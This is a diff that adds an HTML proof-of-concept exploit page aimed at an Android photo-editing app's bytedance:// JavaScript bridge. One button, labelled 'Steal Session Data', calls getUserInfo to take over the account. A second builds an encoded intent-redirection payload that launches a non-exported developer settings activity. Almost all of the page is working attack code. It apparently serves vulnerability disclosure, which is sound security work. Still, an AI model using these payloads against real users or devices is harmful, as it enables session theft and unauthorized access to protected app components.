@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hypic WebActivity Exploit</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>body { font-family: monospace; padding: 20px; }</style>
+</head>
+<body>
+    <h2>1. Account Takeover (getUserInfo)</h2>
+    <button onclick="exfiltrateData()" style="padding:10px; background:red; color:white;">Steal Session Data</button>
+    <pre id="output"></pre>
+
+    <h2>2. Intent Redirection (openSchema)</h2>
+    <button onclick="triggerIntent()" style="padding:10px; background:blue; color:white;">Launch Protected Activity</button>
+
+    <script>
+        // --- VULNERABILITY 1: ACCOUNT TAKEOVER ---
+        function exfiltrateData() {
+            // The app intercepts this scheme and executes WebActivity$JsTaskCallback -> getUserInfo
+            window.location.href = 'bytedance://dispatch_message/?code=getUserInfo&callbackId=123';
+        }
+
+        // --- VULNERABILITY 2: INTENT REDIRECTION ---
+        function triggerIntent() {
+            // Targeting the internal, non-exported Developer Settings activity
+            const targetIntent = "intent:#Intent;component=com.xt.retouchoversea/com.xt.retouch.debug.DevModelActivity;end";
+            
+            // The JSON data block parsed by the K1() method
+            const dataObj = {
+                "schema": targetIntent,
+                "open_other_app": "1" // Adds FLAG_ACTIVITY_NEW_TASK
+            };
+            
+            const encodedData = encodeURIComponent(JSON.stringify(dataObj));
+            
+            // Fire the bridge
+            window.location.href = 'bytedance://dispatch_message/?code=openSchema&data=' + encodedData + '&callbackId=456';
+        }
+    </script>
+</body>
+</html>
